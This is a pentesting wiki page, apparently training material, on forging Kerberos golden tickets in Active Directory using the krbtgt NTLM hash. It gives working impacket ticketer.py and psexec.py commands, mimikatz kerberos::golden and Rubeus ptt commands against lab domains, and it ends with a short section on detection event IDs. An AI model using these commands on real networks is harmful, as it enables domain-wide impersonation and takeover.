# Golden Ticket

## Golden ticket

A valid **TGT as any user **can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain and the impersonated user.

The **krbtgt **account **NTLM hash** can be **obtained **from the **lsass process** or from the **NTDS.dit file **of any DC in the domain. It is also possible to get that NTLM through a **DCsync attack**, which can be performed either with the [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) module of Mimikatz or the impacket example [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Usually, **domain admin privileges or similar are required**, no matter what technique is used.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="From Windows" %}
```bash
mimikatz # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory
```
{% endcode %}

**Once **you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec **or **wmiexec **to obtain a shell (looks like yo can not get a shell via winrm).

### Mitigation

Golden ticket events ID:

* 4624: Account Logon
* 4672: Admin Logon
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

****[**More information about Golden Ticket in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)****
